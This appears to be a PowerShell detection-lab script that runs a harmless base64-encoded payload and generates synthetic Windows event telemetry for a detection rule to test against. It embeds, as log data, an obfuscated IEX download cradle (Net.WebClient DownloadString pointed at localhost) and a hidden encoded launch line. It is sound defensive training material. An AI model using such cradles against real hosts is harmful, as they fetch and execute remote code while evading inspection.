#!/usr/bin/env pwsh
# Invoke-BenignDetonation.ps1
#
# Reproduces the *shape* of an encoded/obfuscated PowerShell abuse - a base64
# -EncodedCommand and an obfuscated scriptblock - but the payload is BENIGN: it
# writes a marker file and prints a beacon string. It does NOTHING harmful: no
# network calls, no persistence, no destructive actions. The point is to generate
# realistic telemetry that New-VigilDetection then fires on, cross-platform, offline.
#
# AUTHORIZATION: only run detonations against systems you own or have explicit
# written permission to test. This detonator targets the shipped lab only.

[CmdletBinding()]
param(
    # Where to write the captured telemetry (the "script-block log" this detonation produces).
    [string]$OutFile = "$PSScriptRoot/telemetry-detonated.json",

    # Where the benign payload drops its marker (proof it ran, harmlessly).
    [string]$MarkerFile = "$PSScriptRoot/../artifacts/benign-marker.txt"
)

$ErrorActionPreference = 'Stop'

# --- 1. Build a BENIGN payload and base64-encode it as a real -EncodedCommand would ---
# PowerShell's -EncodedCommand expects UTF-16LE base64. We build the exact same shape an
# attacker uses, but the command only writes a marker and echoes a beacon - no harm.
$benignPayload = "New-Item -ItemType Directory -Force -Path (Split-Path '$MarkerFile') | Out-Null; " +
    "Set-Content -Path '$MarkerFile' -Value 'VIGIL-BENIGN-DETONATION-OK'; " +
    "Write-Output 'beacon: benign detonation complete'"
$bytes   = [System.Text.Encoding]::Unicode.GetBytes($benignPayload)
$encoded = [System.Convert]::ToBase64String($bytes)

Write-Output '=== Benign detonation: encoding a -EncodedCommand payload (base64, UTF-16LE) ==='
Write-Output "  payload (plaintext): $benignPayload"
Write-Output "  -EncodedCommand    : $($encoded.Substring(0, [Math]::Min(48, $encoded.Length)))..."

# --- 2. DECODE it ourselves (inspection, not execution) to prove the round-trip ---
$decodedBytes = [System.Convert]::FromBase64String($encoded)
$decoded      = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Write-Output "  decoded back to    : $decoded"

# --- 3. Actually RUN the benign payload in-process (safe: writes a marker, prints a beacon) ---
# We run the benign scriptblock directly - we do NOT shell out to `pwsh -EncodedCommand`
# and we do NOT use Invoke-Expression. The scriptblock is authored here, in this file.
Write-Output ''
Write-Output '=== Detonating (benign) ==='
& ([scriptblock]::Create($benignPayload)) | ForEach-Object { Write-Output "  $_" }

# --- 4. Emit the telemetry this detonation would have produced ---
# We synthesize the script-block-logging (EID 4104) and process-creation (EID 4688)
# records the detonation generates, in the same JSON shape the detection consumes.
# An obfuscated (format-operator) IEX cradle line is included as script-block text -
# it is telemetry DATA describing what an attacker's variant would log; it is never run.
$now = (Get-Date).ToUniversalTime()
$obfuscatedCradle = "&('{1}{0}'-f'X','IE')(('{1}{0}' -f 'ent','New-Object Net.WebCli').DownloadString('http://127.0.0.1/benign.ps1'))"

$telemetry = @(
    [pscustomobject]@{
        TimeCreated  = $now.AddSeconds(0).ToString('o')
        Id           = 4688
        ProviderName = 'Microsoft-Windows-Security-Auditing'
        Level        = 'Information'
        Message      = "A new process has been created: pwsh -nop -w hidden -enc $encoded"
    },
    [pscustomobject]@{
        TimeCreated  = $now.AddSeconds(1).ToString('o')
        Id           = 4104
        ProviderName = 'Microsoft-Windows-PowerShell'
        Level        = 'Warning'
        Message      = "Creating Scriptblock text (1 of 1): $decoded"
    },
    [pscustomobject]@{
        TimeCreated  = $now.AddSeconds(2).ToString('o')
        Id           = 4104
        ProviderName = 'Microsoft-Windows-PowerShell'
        Level        = 'Warning'
        Message      = "Creating Scriptblock text (1 of 1): $obfuscatedCradle"
    }
)

$telemetry | ConvertTo-Json -Depth 4 | Set-Content -Path $OutFile
Write-Output ''
Write-Output "=== Telemetry captured -> $OutFile ($($telemetry.Count) events) ==="
Write-Output 'Now run: New-VigilDetection -Path <that file>'
Write-Output '  - the -enc launch (EID 4688) fires: hidden + encoded flags are attacker-shaped.'
Write-Output '  - the obfuscated cradle (EID 4104) fires: format-operator IEX + DownloadString.'
Write-Output '  - the DECODED benign scriptblock (EID 4104) is correctly QUIET - its content is benign.'
Write-Output '  That last one is the lesson: encoding is a signal; decoded intent is the truth.'
